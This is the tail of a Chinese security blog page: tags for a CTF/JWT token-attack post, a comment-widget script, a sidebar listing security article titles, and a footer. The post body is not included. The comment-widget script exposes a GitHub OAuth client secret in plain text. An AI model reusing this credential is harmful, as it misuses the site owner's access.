<div class="tags"><a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a><a href="/tags/web/"><i class="fa fa-tag"></i>web</a><a href="/tags/JWT/"><i class="fa fa-tag"></i>JWT</a><a href="/tags/token%E6%94%BB%E5%87%BB/"><i class="fa fa-tag"></i>token攻击</a></div><div class="post-nav"><a class="next" href="/2021/about-the-online-tools-site.html">关于在线工具站点</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=1.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=1.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=1.0.0"></script><script>var gitalk = new Gitalk({
  clientID: 'a29c90b69a24ed5a320d',
  clientSecret: '62b4bde8f0a28a1a782e49c56380cb10d365cd87',
  repo: 'gitalk',
  owner: 'z1un',
  proxy: 'https://netnr-proxy.cloudno.de/https://github.com/login/oauth/access_token',
  admin: ['z1un'],
  id: md5(location.pathname),
  distractionFreeMode: false
})
gitalk.render('container')
</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Other/">Other</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/attacking-jwt-authentication.html">JWT鉴权攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/about-the-online-tools-site.html">关于在线工具站点</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/z1-aggressorscripts.html">最近写的一款Cobalt Strike插件</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/analysis-of-flask-ssti-template-injection.html">浅析Flask SSTI模板注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/neovim-configuration-file-in-a-fast-scripting-scenario.html">快速脚本编写场景下的neovim配置文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/kerberos-protocol-to-ticket-forgery.html">Kerberos协议到票据伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/ntlm-authentication-to-pth-attack.html">NTLM认证协议到Pass The Hash攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/ciscn-2020-preliminaries.html">CISCN 2020 线上初赛部分WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/from-windows-local-authentication-to-obtaining-hash.html">由Windows本地认证到Hash抓取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/talking-about-intranet-penetration-agent.html">浅谈内网渗透代理</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.w3bsafe.cn/" title="w3bsafe安全团队" target="_blank">w3bsafe安全团队</a><ul></ul><a href="http://www.c-hasel.cn/" title="Corey" target="_blank">Corey</a><ul></ul><a href="http://www.snow404.cn/" title="snow" target="_blank">snow</a><ul></ul><a href="http://www.hackxc.cc/" title="小陈" target="_blank">小陈</a><ul></ul><a href="https://0x20h.com/" title="Sp4ce" target="_blank">Sp4ce</a><ul></ul><a href="https://blog.cdusec.com/" title="成都大学信息安全内部博客" target="_blank">成都大学信息安全内部博客</a><ul></ul><a href="https://dna049.com/" title="dna049" target="_blank">dna049</a><ul></ul><a href="https://jokerm.com/" title="JokerM's Palace" target="_blank">JokerM's Palace</a><ul></ul><a href="https://superj.site/" title="Opt1mus" target="_blank">Opt1mus</a><ul></ul><a href="https://zgao.top/" title="zgao" target="_blank">zgao</a><ul></ul><a href="https://blog.happysec.cn/" title="小北" target="_blank">小北</a><ul></ul><a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><!--#footer= 'Copyright © ' + date(Date.now(), 'YYYY') + ' '--><!--  a(href=url_for('.'), rel='nofollow')= config.title + '.'--><!--  |  Powered by--><!--  a(rel='nofollow', target='_blank', href='https://hexo.io')  Hexo.--><!--  a(rel='nofollow', target='_blank', href='https://github.com/tufu9441/maupassant-hexo')  Theme--><!--  |  by--><!--  a(rel='nofollow', target='_blank', href='https://github.com/pagecho')  Cho.--><div id="footer">Copyright © 2021 <a rel="nofollow" target="_blank" href="https://www.zjun.info"> ZJUN |</a><a rel="nofollow" target="_blank" href="https://beian.miit.gov.cn/"> 蜀ICP备20009085号 |</a><a rel="nofollow" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=51010802000845"> 川公网安备51010802000845号</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=1.0.0"><script type="text/javascript" src="/js/search.js?v=1.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>